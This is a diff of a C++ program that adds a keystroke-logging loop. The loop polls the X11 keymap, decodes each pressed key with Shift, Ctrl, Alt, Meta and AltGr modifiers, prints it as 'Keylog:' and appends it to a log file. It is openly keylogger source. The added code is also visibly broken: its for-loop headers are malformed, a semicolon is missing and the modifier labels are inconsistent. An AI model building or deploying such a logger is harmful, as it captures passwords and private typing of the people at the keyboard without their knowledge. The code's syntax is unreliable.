@@ -4,7 +4,7 @@
 #include <sstream>
 #include <map>
 #include <set>
-#include <cstlib>
+#include <cstdlib>
 #include <csignal>
 #include <fstream>
 
@@ -188,5 +188,93 @@ int main(int argc, const char *const *argv) {
     char keys[32], lastkeys[32];      //buffer for reading keys in previous keys state
 
     std::fill(lastkeys, lastkeys + sizeof(lastkeys), 0);
-        
+
+    //query keyboard in loop
+    bool last_is_nav = false;   //navigation key indicator
+    bool last_is_char =false;   //spaces adjustment
+
+    while (count) {
+        nanosleep(&sleeptime, 0); //avoid busy waiting
+
+        XQueryKeymap(display, keys);
+
+        //read modifiers (case insensitive)
+        bool shift=false, ctrl=false, alt=false, meta=false, altgr=false;
+
+        for (unsigned i=0; i<sizeof(keys); ++i)
+            for (unsigned j=0; test = 1; j<8; ++j, test *= 2)
+                if (keys[i] & test) {
+                    const int code = i*8+j;
+
+                    if (shift_set.find(code) != shift_set.end())
+                        shift = true;
+                    
+                    if (ctrl_set.find(code) != ctrl_set.end())
+                        ctrl = true;
+                    
+                    if (alt_set.find(code) != alt_set.end())
+                        alt = true;
+
+                    if (meta_set.find(code) != meta_set.end())
+                        meta = true;
+
+
+                    if (altgr_set.find(code) != altgr_set.end())
+                        altgr = true;
+                }
+
+        //store changed keys
+        for (unsigned i=0; i<sizeof(keys); ++i)
+            if (keys[i] != lastkeys[i]) {
+                for (unsigned j=0; test=1; j<8; ++j, test *= 2) //checking for changed keys
+                    if ((keys[i] & test) && ((keys[i] & test) != (lastkeys[i] & test))) { // if the was pressed and it wasnt before, print this
+                       const int code = i*8+j
+                       std::string key = key_map[code];
+                       const bool key_is_nav = (key =="Nav");
+
+                       if (! (last_is_nav && key_is_nav) && key.size() > 0) { //print navigation key once
+                        if (! key_is_nav) { // change keys wrt modifiers
+                            if (shift)
+                                key = key_map_upper[code];
+                            
+                            if (meta)
+                                key = "Maj-" + key;
+                            
+                            if (alt)
+                                key = "Alt-" + key;
+
+                            if (ctrl)
+                                key = "ctrl" + key;
+
+                            if (altgr)
+                                key = "AltGr-" + key;
+                        }
+
+                        std::stringstream message;
+                        switch (key.size()) {
+                            case 1:
+                                message << key;
+                                last_is_char = (key != "\n");
+                                break;
+                            
+                            default:
+                                if (last_is_char) {
+                                    last_is_char = false;
+                                }
+                                message << '[' <<key<< "]";
+                                break;
+                        }
+                        std::cout << std::endl << "Keylog: " << message.str() << std::endl;
+                        file_output << message.str();
+                        last_is_nav = key_is_nav;
+                        
+                       }
+                    } 
+                lastkeys[i] = keys[i];
+            }
+    }
+    file_output << std::endl;
+    file_output.close();
+
+    XCloseDisplay(display);
 }
